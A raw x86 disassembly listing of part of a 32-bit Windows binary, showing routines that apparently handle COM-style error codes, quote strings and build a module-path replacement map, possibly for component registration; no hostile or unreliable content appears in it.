  4026d0:	push   ebx
  4026d1:	mov    ebx,DWORD PTR [ebp+0x8]
  4026d4:	test   ebx,ebx
  4026d6:	jne    0x4026df
  4026d8:	mov    eax,0x80004003
  4026dd:	jmp    0x40271e
  4026df:	push   esi
  4026e0:	push   edi
  4026e1:	xor    edi,edi
  4026e3:	lea    esi,[ecx+0x28]
  4026e6:	cmp    DWORD PTR [esi],edi
  4026e8:	jne    0x402704
  4026ea:	push   esi
  4026eb:	push   0x40147c
  4026f0:	push   0x1
  4026f2:	push   edi
  4026f3:	push   0x4012dc
  4026f8:	call   DWORD PTR ds:0x409108
  4026fe:	mov    edi,eax
  402700:	test   edi,edi
  402702:	js     0x40271a
  402704:	mov    ecx,DWORD PTR [esi]
  402706:	mov    DWORD PTR [ebx],ecx
  402708:	mov    ecx,DWORD PTR [esi]
  40270a:	push   ecx
  40270b:	mov    edx,DWORD PTR [ecx]
  40270d:	mov    esi,DWORD PTR [edx+0x4]
  402710:	mov    ecx,esi
  402712:	call   DWORD PTR ds:0x409254
  402718:	call   esi
  40271a:	mov    eax,edi
  40271c:	pop    edi
  40271d:	pop    esi
  40271e:	mov    ecx,DWORD PTR [ebp-0x4]
  402721:	xor    ecx,ebp
  402723:	pop    ebx
  402724:	call   0x4071f0
  402729:	mov    esp,ebp
  40272b:	pop    ebp
  40272c:	ret    0x4
  40272f:	int3   
  402730:	int3   
  402731:	int3   
  402732:	int3   
  402733:	int3   
  402734:	int3   
  402735:	int3   
  402736:	int3   
  402737:	int3   
  402738:	int3   
  402739:	int3   
  40273a:	int3   
  40273b:	int3   
  40273c:	int3   
  40273d:	int3   
  40273e:	int3   
  40273f:	int3   
  402740:	mov    edi,edi
  402742:	push   ebp
  402743:	mov    ebp,esp
  402745:	push   ecx
  402746:	mov    eax,ds:0x408008
  40274b:	xor    eax,ebp
  40274d:	mov    DWORD PTR [ebp-0x4],eax
  402750:	mov    eax,DWORD PTR [ebp+0x8]
  402753:	push   esi
  402754:	push   0x401748
  402759:	push   0x40148c
  40275e:	mov    ecx,DWORD PTR [eax]
  402760:	push   eax
  402761:	mov    esi,DWORD PTR [ecx+0xc]
  402764:	mov    ecx,esi
  402766:	call   DWORD PTR ds:0x409254
  40276c:	call   esi
  40276e:	mov    ecx,DWORD PTR [ebp-0x4]
  402771:	xor    ecx,ebp
  402773:	pop    esi
  402774:	call   0x4071f0
  402779:	mov    esp,ebp
  40277b:	pop    ebp
  40277c:	ret    0x4
  40277f:	int3   
  402780:	int3   
  402781:	int3   
  402782:	int3   
  402783:	int3   
  402784:	int3   
  402785:	int3   
  402786:	int3   
  402787:	int3   
  402788:	int3   
  402789:	int3   
  40278a:	int3   
  40278b:	int3   
  40278c:	int3   
  40278d:	int3   
  40278e:	int3   
  40278f:	int3   
  402790:	mov    eax,0x80004005
  402795:	ret    0x10
  402798:	int3   
  402799:	int3   
  40279a:	int3   
  40279b:	int3   
  40279c:	int3   
  40279d:	mov    edi,edi
  40279f:	push   ebp
  4027a0:	mov    ebp,esp
  4027a2:	sub    esp,0xa50
  4027a8:	mov    eax,ds:0x408008
  4027ad:	xor    eax,ebp
  4027af:	mov    DWORD PTR [ebp-0x4],eax
  4027b2:	push   ebx
  4027b3:	xor    eax,eax
  4027b5:	mov    DWORD PTR [ebp-0xa50],0x401340
  4027bf:	push   esi
  4027c0:	mov    esi,DWORD PTR [ebp+0xc]
  4027c3:	mov    ebx,edx
  4027c5:	mov    DWORD PTR [ebp-0xa4c],eax
  4027cb:	mov    DWORD PTR [ebp-0xa48],eax
  4027d1:	mov    DWORD PTR [ebp-0xa44],eax
  4027d7:	push   edi
  4027d8:	mov    edi,ecx
  4027da:	test   esi,esi
  4027dc:	je     0x4027f9
  4027de:	jmp    0x4027f3
  4027e0:	push   DWORD PTR [esi+0x4]
  4027e3:	push   eax
  4027e4:	lea    eax,[ebp-0xa50]
  4027ea:	push   eax
  4027eb:	call   0x402d30
  4027f0:	lea    esi,[esi+0x8]
  4027f3:	mov    eax,DWORD PTR [esi]
  4027f5:	test   eax,eax
  4027f7:	jne    0x4027e0
  4027f9:	lea    eax,[ebp-0xa50]
  4027ff:	mov    ecx,edi
  402801:	push   eax
  402802:	call   0x402740
  402807:	mov    esi,eax
  402809:	test   esi,esi
  40280b:	js     0x402939
  402811:	mov    esi,DWORD PTR ds:0x408460
  402817:	lea    eax,[ebp-0x20c]
  40281d:	push   0x104
  402822:	push   eax
  402823:	xor    edi,edi
  402825:	push   esi
  402826:	mov    DWORD PTR [ebp-0xa38],edi
  40282c:	call   DWORD PTR ds:0x409060
  402832:	test   eax,eax
  402834:	jne    0x402842
  402836:	call   0x402dbf
  40283b:	mov    esi,eax
  40283d:	jmp    0x40292e
  402842:	cmp    eax,0x104
  402847:	jne    0x40285e
  402849:	lea    ecx,[ebp-0xa38]
  40284f:	call   0x4031d8
  402854:	mov    esi,0x8007007a
  402859:	jmp    0x402939
  40285e:	lea    eax,[ebp-0x20c]
  402864:	mov    edx,0x208
  402869:	push   eax
  40286a:	lea    ecx,[ebp-0xa34]
  402870:	call   0x402b00
  402875:	test   esi,esi
  402877:	je     0x40288c
  402879:	push   edi
  40287a:	call   DWORD PTR ds:0x409048
  402880:	cmp    esi,eax
  402882:	je     0x40288c
  402884:	lea    eax,[ebp-0xa34]
  40288a:	jmp    0x4028f8
  40288c:	push   0x22
  40288e:	pop    esi
  40288f:	lea    eax,[ebp-0xa34]
  402895:	mov    WORD PTR [ebp-0x624],si
  40289c:	push   eax
  40289d:	mov    edx,0x20b
  4028a2:	lea    ecx,[ebp-0x622]
  4028a8:	call   0x402b53
  4028ad:	test   al,al
  4028af:	jne    0x4028c3
  4028b1:	lea    ecx,[ebp-0xa38]
  4028b7:	call   0x4031d8
  4028bc:	mov    esi,0x80004005
  4028c1:	jmp    0x402939
  4028c3:	lea    ecx,[ebp-0x624]
  4028c9:	call   0x402b8f
  4028ce:	mov    WORD PTR [ebp+eax*2-0x624],si
  4028d6:	lea    eax,[eax*2+0x2]
  4028dd:	cmp    eax,0x418
  4028e2:	jae    0x402993
  4028e8:	xor    ecx,ecx
  4028ea:	mov    WORD PTR [ebp+eax*1-0x624],cx
  4028f2:	lea    eax,[ebp-0x624]
  4028f8:	push   eax
  4028f9:	push   0x401498
  4028fe:	lea    eax,[ebp-0xa50]
  402904:	push   eax
  402905:	call   0x402d30
  40290a:	mov    esi,eax
  40290c:	test   esi,esi
  40290e:	js     0x40292e
  402910:	lea    eax,[ebp-0xa34]
  402916:	push   eax
  402917:	push   0x4014a8
  40291c:	lea    eax,[ebp-0xa50]
  402922:	push   eax
  402923:	call   0x402d30
  402928:	mov    esi,eax
  40292a:	test   esi,esi
  40292c:	jns    0x402959
  40292e:	lea    ecx,[ebp-0xa38]
  402934:	call   0x4031d8
  402939:	lea    ecx,[ebp-0xa50]
  40293f:	call   0x402ad9
  402944:	mov    ecx,DWORD PTR [ebp-0x4]
  402947:	mov    eax,esi
  402949:	pop    edi
  40294a:	pop    esi
  40294b:	xor    ecx,ebp
  40294d:	pop    ebx
  40294e:	call   0x4071f0
  402953:	mov    esp,ebp
  402955:	pop    ebp
  402956:	ret    0x8
  402959:	lea    ecx,[ebp-0xa50]
  40295f:	mov    DWORD PTR [ebp-0xa3c],edi
  402965:	movzx  eax,bx
  402968:	cmp    DWORD PTR [ebp+0x8],edi
  40296b:	je     0x402971
  40296d:	push   0x1
  40296f:	jmp    0x402972
  402971:	push   edi
  402972:	push   0x4014c0
  402977:	push   eax
  402978:	lea    eax,[ebp-0x20c]
  40297e:	push   eax
  40297f:	call   0x40416f
  402984:	lea    ecx,[ebp-0xa3c]
  40298a:	mov    esi,eax
  40298c:	call   0x4031d8
  402991:	jmp    0x40292e
  402993:	call   0x407470
  402998:	int3   
  402999:	int3   
  40299a:	int3   
  40299b:	int3   
  40299c:	int3   
  40299d:	int3   
  40299e:	int3   
  40299f:	int3   
  4029a0:	mov    edi,edi
  4029a2:	push   ebp
  4029a3:	mov    ebp,esp
  4029a5:	push   DWORD PTR [ebp+0x14]
  4029a8:	mov    edx,DWORD PTR [ebp+0xc]
  4029ab:	push   DWORD PTR [ebp+0x10]
  4029ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4029b1:	call   0x40279d
  4029b6:	pop    ebp
  4029b7:	ret    0x10
  4029ba:	int3   
  4029bb:	int3   
  4029bc:	int3   
  4029bd:	int3   
  4029be:	int3   
  4029bf:	int3   
  4029c0:	mov    edi,edi
  4029c2:	push   ebp
  4029c3:	mov    ebp,esp
  4029c5:	mov    eax,DWORD PTR [ebp+0x10]
  4029c8:	test   eax,eax
  4029ca:	je     0x4029cf
  4029cc:	and    DWORD PTR [eax],0x0
  4029cf:	mov    eax,0x80004001
  4029d4:	pop    ebp
  4029d5:	ret    0xc
  4029d8:	int3   
  4029d9:	int3   
  4029da:	int3   
  4029db:	int3   
  4029dc:	int3   
  4029dd:	int3   
  4029de:	int3   
  4029df:	int3   
  4029e0:	xor    eax,eax
  4029e2:	inc    eax
  4029e3:	ret    0x4
  4029e6:	int3   
  4029e7:	int3   
  4029e8:	int3   
  4029e9:	int3   
  4029ea:	int3   
  4029eb:	int3   
  4029ec:	int3   
  4029ed:	int3   
  4029ee:	int3   
  4029ef:	int3   
  4029f0:	xor    eax,eax
  4029f2:	ret    0x4
  4029f5:	int3   
  4029f6:	int3   
  4029f7:	int3   
  4029f8:	int3   
  4029f9:	int3   
  4029fa:	int3   
  4029fb:	int3   
  4029fc:	int3   
  4029fd:	int3   
  4029fe:	int3   
  4029ff:	int3   
  402a00:	mov    edi,edi
  402a02:	push   ebp
  402a03:	mov    ebp,esp
  402a05:	push   esi
  402a06:	mov    esi,ecx
  402a08:	call   0x402ad9
  402a0d:	test   BYTE PTR [ebp+0x8],0x1
  402a11:	je     0x402a1a
  402a13:	push   esi
  402a14:	call   0x406e3c
  402a19:	pop    ecx
  402a1a:	mov    eax,esi
  402a1c:	pop    esi
  402a1d:	pop    ebp
  402a1e:	ret    0x4
  402a21:	int3   
  402a22:	int3   
  402a23:	int3   
  402a24:	int3   
  402a25:	int3   
  402a26:	mov    edi,edi
  402a28:	push   esi
  402a29:	mov    esi,ecx
  402a2b:	cmp    DWORD PTR [esi],0x0
  402a2e:	je     0x402a3c
  402a30:	push   DWORD PTR [esi]
  402a32:	call   DWORD PTR ds:0x40923c
  402a38:	and    DWORD PTR [esi],0x0
  402a3b:	pop    ecx
  402a3c:	cmp    DWORD PTR [esi+0x4],0x0
  402a40:	je     0x402a50
  402a42:	push   DWORD PTR [esi+0x4]
  402a45:	call   DWORD PTR ds:0x40923c
  402a4b:	and    DWORD PTR [esi+0x4],0x0
  402a4f:	pop    ecx
  402a50:	and    DWORD PTR [esi+0x8],0x0
  402a54:	pop    esi
  402a55:	ret    
  402a56:	int3   
  402a57:	int3   
  402a58:	int3   
  402a59:	int3   
  402a5a:	int3   
  402a5b:	mov    edi,edi
  402a5d:	push   esi
  402a5e:	push   edi
  402a5f:	mov    edi,ecx
  402a61:	xor    esi,esi
  402a63:	mov    eax,DWORD PTR [edi+0x8]
  402a66:	test   eax,eax
  402a68:	jle    0x402a96
  402a6a:	test   esi,esi
  402a6c:	js     0x402aa2
  402a6e:	cmp    esi,eax
  402a70:	jge    0x402aa2
  402a72:	mov    eax,DWORD PTR [edi]
  402a74:	push   DWORD PTR [eax+esi*4]
  402a77:	call   0x406e46
  402a7c:	pop    ecx
  402a7d:	cmp    esi,DWORD PTR [edi+0x8]
  402a80:	jge    0x402aa2
  402a82:	mov    eax,DWORD PTR [edi+0x4]
  402a85:	push   DWORD PTR [eax+esi*4]
  402a88:	call   0x406e46
  402a8d:	mov    eax,DWORD PTR [edi+0x8]
  402a90:	inc    esi
  402a91:	pop    ecx
  402a92:	cmp    esi,eax
  402a94:	jl     0x402a6a
  402a96:	mov    ecx,edi
  402a98:	call   0x402a26
  402a9d:	pop    edi
  402a9e:	xor    eax,eax
  402aa0:	pop    esi
  402aa1:	ret    
  402aa2:	mov    ecx,0xc000008c
  402aa7:	call   0x4046b4
  402aac:	int3   
  402aad:	int3   
  402aae:	int3   
  402aaf:	int3   
  402ab0:	int3   
  402ab1:	int3   
  402ab2:	int3   
  402ab3:	int3   
  402ab4:	int3   
  402ab5:	int3   
  402ab6:	int3   
  402ab7:	int3   
  402ab8:	int3   
  402ab9:	int3   
  402aba:	int3   
  402abb:	int3   
  402abc:	int3   
  402abd:	int3   
  402abe:	int3   
  402abf:	int3   
  402ac0:	mov    edi,edi
  402ac2:	push   ebp
  402ac3:	mov    ebp,esp
  402ac5:	mov    ecx,DWORD PTR [ebp+0x8]
  402ac8:	lea    ecx,[ecx+0x4]
  402acb:	call   0x402a5b
  402ad0:	pop    ebp
  402ad1:	ret    0x4
  402ad4:	int3   
  402ad5:	int3   
  402ad6:	int3   
  402ad7:	int3   
  402ad8:	int3   
  402ad9:	mov    edi,edi
  402adb:	push   esi
  402adc:	lea    esi,[ecx+0x4]
  402adf:	mov    DWORD PTR [ecx],0x401340
  402ae5:	mov    ecx,esi
  402ae7:	call   0x402a5b
  402aec:	mov    ecx,esi
  402aee:	call   0x402a5b
  402af3:	mov    ecx,esi
  402af5:	pop    esi
  402af6:	jmp    0x402a26
  402afb:	int3   
  402afc:	int3   
  402afd:	int3   
  402afe:	int3   
  402aff:	int3   
  402b00:	mov    edi,edi
  402b02:	push   ebp
  402b03:	mov    ebp,esp
  402b05:	push   ebx
  402b06:	mov    ebx,edx
  402b08:	push   esi
  402b09:	xor    esi,esi
  402b0b:	lea    edx,[ebx-0x1]
  402b0e:	test   edx,edx
  402b10:	je     0x402b42
  402b12:	push   edi
  402b13:	mov    edi,DWORD PTR [ebp+0x8]
  402b16:	movzx  eax,WORD PTR [edi]
  402b19:	test   ax,ax
  402b1c:	je     0x402b41
  402b1e:	mov    WORD PTR [ecx+esi*2],ax
  402b22:	push   0x27
  402b24:	pop    eax
  402b25:	cmp    WORD PTR [edi],ax
  402b28:	jne    0x402b39
  402b2a:	lea    eax,[ebx-0x2]
  402b2d:	cmp    esi,eax
  402b2f:	jae    0x402b39
  402b31:	inc    esi
  402b32:	push   0x27
  402b34:	pop    eax
  402b35:	mov    WORD PTR [ecx+esi*2],ax
  402b39:	add    edi,0x2
  402b3c:	inc    esi
  402b3d:	cmp    esi,edx
  402b3f:	jb     0x402b16
  402b41:	pop    edi
  402b42:	xor    eax,eax
  402b44:	mov    WORD PTR [ecx+esi*2],ax
  402b48:	pop    esi
  402b49:	pop    ebx
  402b4a:	pop    ebp
  402b4b:	ret    0x4
  402b4e:	int3   
  402b4f:	int3   
  402b50:	int3   
  402b51:	int3   
  402b52:	int3   
  402b53:	mov    edi,edi
  402b55:	push   ebp
  402b56:	mov    ebp,esp
  402b58:	push   esi
  402b59:	push   edi
  402b5a:	mov    edi,ecx
  402b5c:	mov    esi,edx
  402b5e:	mov    ecx,DWORD PTR [ebp+0x8]
  402b61:	call   0x402b8f
  402b66:	lea    eax,[eax*2+0x2]
  402b6d:	push   eax
  402b6e:	push   DWORD PTR [ebp+0x8]
  402b71:	lea    eax,[esi+esi*1]
  402b74:	push   eax
  402b75:	push   edi
  402b76:	call   DWORD PTR ds:0x409230
  402b7c:	add    esp,0x10
  402b7f:	neg    eax
  402b81:	sbb    eax,eax
  402b83:	inc    eax
  402b84:	pop    edi
  402b85:	pop    esi
  402b86:	pop    ebp
  402b87:	ret    0x4
  402b8a:	int3   
  402b8b:	int3   
  402b8c:	int3   
  402b8d:	int3   
  402b8e:	int3   
  402b8f:	test   ecx,ecx
  402b91:	jne    0x402b96
  402b93:	xor    eax,eax
  402b95:	ret    
  402b96:	lea    edx,[ecx+0x2]
  402b99:	mov    ax,WORD PTR [ecx]
  402b9c:	add    ecx,0x2
  402b9f:	test   ax,ax
  402ba2:	jne    0x402b99
  402ba4:	sub    ecx,edx
  402ba6:	sar    ecx,1
  402ba8:	mov    eax,ecx
  402baa:	ret    
  402bab:	int3   
  402bac:	int3   
  402bad:	int3   
  402bae:	int3   
  402baf:	int3   
  402bb0:	mov    edi,edi
  402bb2:	push   ebp
  402bb3:	mov    ebp,esp
  402bb5:	push   esi
  402bb6:	mov    esi,ecx
  402bb8:	push   0x4
  402bba:	mov    eax,DWORD PTR [esi+0x8]
  402bbd:	inc    eax
  402bbe:	push   eax
  402bbf:	push   DWORD PTR [esi]
  402bc1:	call   DWORD PTR ds:0x408000
  402bc7:	add    esp,0xc
  402bca:	test   eax,eax
  402bcc:	jne    0x402bd2
  402bce:	xor    eax,eax
  402bd0:	jmp    0x402c15
  402bd2:	mov    DWORD PTR [esi],eax
  402bd4:	mov    eax,DWORD PTR [esi+0x8]
  402bd7:	push   0x4
  402bd9:	inc    eax
  402bda:	push   eax
  402bdb:	push   DWORD PTR [esi+0x4]
  402bde:	call   DWORD PTR ds:0x408000
  402be4:	add    esp,0xc
  402be7:	test   eax,eax
  402be9:	je     0x402bce
  402beb:	mov    edx,DWORD PTR [esi+0x8]
  402bee:	mov    ecx,DWORD PTR [esi]
  402bf0:	shl    edx,0x2
  402bf3:	mov    DWORD PTR [esi+0x4],eax
  402bf6:	add    ecx,edx
  402bf8:	je     0x402c01
  402bfa:	mov    eax,DWORD PTR [ebp+0x8]
  402bfd:	mov    eax,DWORD PTR [eax]
  402bff:	mov    DWORD PTR [ecx],eax
  402c01:	mov    ecx,DWORD PTR [esi+0x4]
  402c04:	add    ecx,edx
  402c06:	je     0x402c0f
  402c08:	mov    eax,DWORD PTR [ebp+0xc]
  402c0b:	mov    eax,DWORD PTR [eax]
  402c0d:	mov    DWORD PTR [ecx],eax
  402c0f:	inc    DWORD PTR [esi+0x8]
  402c12:	xor    eax,eax
  402c14:	inc    eax
  402c15:	pop    esi
  402c16:	pop    ebp
  402c17:	ret    0x8
  402c1a:	int3   
  402c1b:	int3   
  402c1c:	int3   
  402c1d:	int3   
  402c1e:	int3   
  402c1f:	mov    edi,edi
  402c21:	push   ebp
  402c22:	mov    ebp,esp
  402c24:	sub    esp,0x14
  402c27:	cmp    DWORD PTR [ebp+0x8],0x0
  402c2b:	mov    DWORD PTR [ebp-0x14],ecx
  402c2e:	je     0x402d17
  402c34:	cmp    DWORD PTR [ebp+0xc],0x0
  402c38:	je     0x402d17
  402c3e:	mov    ecx,DWORD PTR [ebp+0x8]
  402c41:	push   ebx
  402c42:	push   esi
  402c43:	push   edi
  402c44:	push   0x2
  402c46:	xor    ebx,ebx
  402c48:	lea    edx,[ecx+0x2]
  402c4b:	pop    esi
  402c4c:	mov    ax,WORD PTR [ecx]
  402c4f:	add    ecx,esi
  402c51:	cmp    ax,bx
  402c54:	jne    0x402c4c
  402c56:	sub    ecx,edx
  402c58:	sar    ecx,1
  402c5a:	lea    eax,[ecx*2+0x2]
  402c61:	xor    ecx,ecx
  402c63:	mov    DWORD PTR [ebp-0x4],eax
  402c66:	mul    esi
  402c68:	seto   cl
  402c6b:	neg    ecx
  402c6d:	or     ecx,eax
  402c6f:	push   ecx
  402c70:	call   0x406e50
  402c75:	pop    ecx
  402c76:	mov    ecx,DWORD PTR [ebp+0xc]
  402c79:	mov    edi,eax
  402c7b:	mov    DWORD PTR [ebp-0x10],edi
  402c7e:	call   0x402b8f
  402c83:	xor    ecx,ecx
  402c85:	lea    eax,[eax*2+0x2]
  402c8c:	mov    DWORD PTR [ebp-0x8],eax
  402c8f:	mul    esi
  402c91:	seto   cl
  402c94:	neg    ecx
  402c96:	or     ecx,eax
  402c98:	push   ecx
  402c99:	call   0x406e50
  402c9e:	mov    esi,eax
  402ca0:	mov    DWORD PTR [ebp-0xc],esi
  402ca3:	pop    ecx
  402ca4:	test   edi,edi
  402ca6:	je     0x402cf8
  402ca8:	test   esi,esi
  402caa:	je     0x402cf8
  402cac:	mov    eax,DWORD PTR [ebp-0x4]
  402caf:	push   eax
  402cb0:	push   DWORD PTR [ebp+0x8]
  402cb3:	push   eax
  402cb4:	push   edi
  402cb5:	call   DWORD PTR ds:0x409230
  402cbb:	add    esp,0x10
  402cbe:	mov    ecx,eax
  402cc0:	call   0x40467c
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	push   eax
  402cc9:	push   DWORD PTR [ebp+0xc]
  402ccc:	push   eax
  402ccd:	push   esi
  402cce:	call   DWORD PTR ds:0x409230
  402cd4:	add    esp,0x10
  402cd7:	mov    ecx,eax
  402cd9:	call   0x40467c
  402cde:	mov    ecx,DWORD PTR [ebp-0x14]
  402ce1:	lea    eax,[ebp-0xc]
  402ce4:	push   eax
  402ce5:	lea    eax,[ebp-0x10]
  402ce8:	push   eax
  402ce9:	call   0x402bb0
  402cee:	test   eax,eax
  402cf0:	je     0x402cf8
  402cf2:	mov    edi,ebx
  402cf4:	mov    esi,ebx
  402cf6:	jmp    0x402cfd
  402cf8:	mov    ebx,0x8007000e
  402cfd:	push   esi
  402cfe:	call   0x406e46
  402d03:	push   edi
  402d04:	call   0x406e46
  402d09:	pop    ecx
  402d0a:	pop    ecx
  402d0b:	xor    eax,eax
  402d0d:	test   ebx,ebx
  402d0f:	pop    edi
  402d10:	pop    esi
  402d11:	setns  al
  402d14:	pop    ebx
  402d15:	jmp    0x402d19
  402d17:	xor    eax,eax
  402d19:	mov    esp,ebp
  402d1b:	pop    ebp
  402d1c:	ret    0x8
  402d1f:	int3   
  402d20:	int3   
  402d21:	int3   
  402d22:	int3   
  402d23:	int3   
  402d24:	int3   
  402d25:	int3   
  402d26:	int3   
  402d27:	int3   
  402d28:	int3   
  402d29:	int3   
  402d2a:	int3   
  402d2b:	int3   
  402d2c:	int3   
  402d2d:	int3   
  402d2e:	int3   
  402d2f:	int3   
  402d30:	mov    edi,edi
  402d32:	push   ebp
  402d33:	mov    ebp,esp
  402d35:	push   ecx
  402d36:	cmp    DWORD PTR [ebp+0xc],0x0
  402d3a:	je     0x402d73
  402d3c:	cmp    DWORD PTR [ebp+0x10],0x0
  402d40:	je     0x402d73
  402d42:	mov    ecx,DWORD PTR [ebp+0x8]
  402d45:	and    DWORD PTR [ebp-0x4],0x0
  402d49:	push   esi
  402d4a:	push   DWORD PTR [ebp+0x10]
  402d4d:	lea    ecx,[ecx+0x4]
  402d50:	push   DWORD PTR [ebp+0xc]
  402d53:	call   0x402c1f
  402d58:	neg    eax
  402d5a:	lea    ecx,[ebp-0x4]
  402d5d:	sbb    esi,esi
  402d5f:	and    esi,0x7ff8fff2
  402d65:	call   0x4031d8
  402d6a:	lea    eax,[esi-0x7ff8fff2]
  402d70:	pop    esi
  402d71:	jmp    0x402d78
  402d73:	mov    eax,0x80070057
  402d78:	mov    esp,ebp
  402d7a:	pop    ebp
  402d7b:	ret    0xc
  402d7e:	int3   
  402d7f:	int3   
  402d80:	int3   
  402d81:	int3   
  402d82:	int3   
  402d83:	push   DWORD PTR [ecx]
  402d85:	call   DWORD PTR ds:0x40923c
  402d8b:	pop    ecx
  402d8c:	ret    
  402d8d:	int3   
  402d8e:	int3   
  402d8f:	int3   
  402d90:	int3   
  402d91:	int3   
  402d92:	mov    edi,edi
  402d94:	push   ebp
  402d95:	mov    ebp,esp
  402d97:	push   esi
  402d98:	push   DWORD PTR [ebp+0x8]
  402d9b:	mov    esi,ecx
  402d9d:	call   DWORD PTR ds:0x409234
  402da3:	pop    ecx
  402da4:	test   eax,eax
  402da6:	je     0x402daf
  402da8:	mov    DWORD PTR [esi],eax
  402daa:	pop    esi
  402dab:	pop    ebp
  402dac:	ret    0x4
  402daf:	mov    ecx,0x8007000e
  402db4:	call   0x4046c7
  402db9:	int3   
  402dba:	int3   
  402dbb:	int3   
  402dbc:	int3   
  402dbd:	int3   
  402dbe:	int3   
  402dbf:	call   DWORD PTR ds:0x409040
  402dc5:	test   eax,eax
  402dc7:	jle    0x402dd1
  402dc9:	movzx  eax,ax
  402dcc:	or     eax,0x80070000
  402dd1:	ret    
  402dd2:	int3   
  402dd3:	int3   
  402dd4:	int3   
  402dd5:	int3   
  402dd6:	int3   
  402dd7:	mov    edi,edi
  402dd9:	push   ebp
  402dda:	mov    ebp,esp
  402ddc:	push   ebx
  402ddd:	push   esi
  402dde:	push   edi
  402ddf:	mov    edi,ecx
  402de1:	xor    ebx,ebx
  402de3:	mov    esi,ebx
  402de5:	cmp    DWORD PTR [edi+0xc],ebx
  402de8:	jle    0x402e03
  402dea:	mov    eax,DWORD PTR [edi+0x4]
  402ded:	push   DWORD PTR [ebp+0x8]
  402df0:	push   DWORD PTR [eax+esi*4]
  402df3:	call   DWORD PTR ds:0x40904c
  402df9:	test   eax,eax
  402dfb:	je     0x402e06
  402dfd:	inc    esi
  402dfe:	cmp    esi,DWORD PTR [edi+0xc]
  402e01:	jl     0x402dea
  402e03:	or     esi,0xffffffff
  402e06:	cmp    esi,0xffffffff
  402e09:	je     0x402e1a
  402e0b:	test   esi,esi
  402e0d:	js     0x402e23
  402e0f:	cmp    esi,DWORD PTR [edi+0xc]
  402e12:	jge    0x402e23
  402e14:	mov    eax,DWORD PTR [edi+0x8]
  402e17:	mov    ebx,DWORD PTR [eax+esi*4]
  402e1a:	pop    edi
  402e1b:	pop    esi
  402e1c:	mov    eax,ebx
  402e1e:	pop    ebx
  402e1f:	pop    ebp
  402e20:	ret    0x4
  402e23:	mov    ecx,0xc000008c
  402e28:	call   0x4046b4
  402e2d:	int3   
  402e2e:	int3   
  402e2f:	int3   
  402e30:	int3   
  402e31:	int3   
  402e32:	int3   
  402e33:	mov    edi,edi
  402e35:	push   ebp
  402e36:	mov    ebp,esp
  402e38:	push   ebx
  402e39:	mov    ebx,DWORD PTR [ebp+0xc]
  402e3c:	push   esi
  402e3d:	mov    esi,ecx
  402e3f:	push   edi
  402e40:	lea    ecx,[ebx+0x1]
  402e43:	add    ecx,DWORD PTR [esi]
  402e45:	cmp    ecx,DWORD PTR [esi]
  402e47:	jle    0x402ed8
  402e4d:	cmp    ecx,ebx
  402e4f:	jle    0x402ed8
  402e55:	mov    edi,DWORD PTR [esi+0x4]
  402e58:	cmp    ecx,edi
  402e5a:	jl     0x402e90
  402e5c:	cmp    edi,0x3fffffff
  402e62:	jg     0x402ed8
  402e64:	add    edi,edi
  402e66:	cmp    ecx,edi
  402e68:	jge    0x402e5c
  402e6a:	push   0x2
  402e6c:	mov    eax,edi
  402e6e:	pop    ecx
  402e6f:	mul    ecx
  402e71:	test   edx,edx
  402e73:	ja     0x402ed8
  402e75:	jb     0x402e7c
  402e77:	cmp    eax,0xffffffff
  402e7a:	ja     0x402ed8
  402e7c:	push   eax
  402e7d:	push   DWORD PTR [esi+0x8]
  402e80:	call   DWORD PTR ds:0x409114
  402e86:	test   eax,eax
  402e88:	je     0x402ed8
  402e8a:	mov    DWORD PTR [esi+0x8],eax
  402e8d:	mov    DWORD PTR [esi+0x4],edi
  402e90:	mov    ecx,DWORD PTR [esi]
  402e92:	test   ecx,ecx
  402e94:	js     0x402ed8
  402e96:	cmp    ecx,DWORD PTR [esi+0x4]
  402e99:	jge    0x402ed8
  402e9b:	mov    edx,DWORD PTR [esi+0x4]
  402e9e:	sub    edx,ecx
  402ea0:	cmp    edx,DWORD PTR [esi+0x4]
  402ea3:	jg     0x402ed8
  402ea5:	mov    eax,DWORD PTR [esi+0x8]
  402ea8:	add    edx,edx
  402eaa:	lea    ecx,[eax+ecx*2]
  402ead:	lea    eax,[ebx+ebx*1]
  402eb0:	push   eax
  402eb1:	push   DWORD PTR [ebp+0x8]
  402eb4:	push   edx
  402eb5:	push   ecx
  402eb6:	call   DWORD PTR ds:0x409230
  402ebc:	add    esp,0x10
  402ebf:	mov    ecx,eax
  402ec1:	call   0x40467c
  402ec6:	add    DWORD PTR [esi],ebx
  402ec8:	xor    edx,edx
  402eca:	mov    eax,DWORD PTR [esi+0x8]
  402ecd:	mov    ecx,DWORD PTR [esi]
  402ecf:	mov    WORD PTR [eax+ecx*2],dx
  402ed3:	xor    eax,eax
  402ed5:	inc    eax
  402ed6:	jmp    0x402eda
  402ed8:	xor    eax,eax
  402eda:	pop    edi
  402edb:	pop    esi
  402edc:	pop    ebx
  402edd:	pop    ebp
  402ede:	ret    0x8
  402ee1:	int3   
  402ee2:	int3   
  402ee3:	int3   
  402ee4:	int3   
  402ee5:	int3   
  402ee6:	mov    edi,edi
  402ee8:	push   ebp
  402ee9:	mov    ebp,esp
  402eeb:	sub    esp,0x5c
  402eee:	mov    eax,ds:0x408008
  402ef3:	xor    eax,ebp
  402ef5:	mov    DWORD PTR [ebp-0x4],eax
  402ef8:	mov    eax,DWORD PTR [ebp+0xc]
  402efb:	push   ebx
  402efc:	push   esi
  402efd:	mov    esi,DWORD PTR [ebp+0x8]
  402f00:	mov    ebx,ecx
  402f02:	mov    DWORD PTR [ebp-0x54],eax
  402f05:	test   esi,esi
  402f07:	je     0x403082
  402f0d:	test   eax,eax
  402f0f:	je     0x403082
  402f15:	mov    ecx,esi
  402f17:	push   edi
  402f18:	xor    edi,edi
  402f1a:	mov    DWORD PTR [eax],edi
  402f1c:	lea    edx,[ecx+0x2]
  402f1f:	mov    ax,WORD PTR [ecx]
  402f22:	add    ecx,0x2
  402f25:	cmp    ax,di
  402f28:	jne    0x402f1f
  402f2a:	sub    ecx,edx
  402f2c:	sar    ecx,1
  402f2e:	lea    eax,[ecx+ecx*1]
  402f31:	cmp    eax,0x64
  402f34:	jge    0x402f3b
  402f36:	mov    eax,0x3e8
  402f3b:	push   0x2
  402f3d:	pop    ecx
  402f3e:	mov    DWORD PTR [ebp-0x4c],eax
  402f41:	mul    ecx
  402f43:	mov    DWORD PTR [ebp-0x50],edi
  402f46:	cmp    edx,edi
  402f48:	ja     0x40306c
  402f4e:	cmp    eax,0xffffffff
  402f51:	ja     0x40306c
  402f57:	push   eax
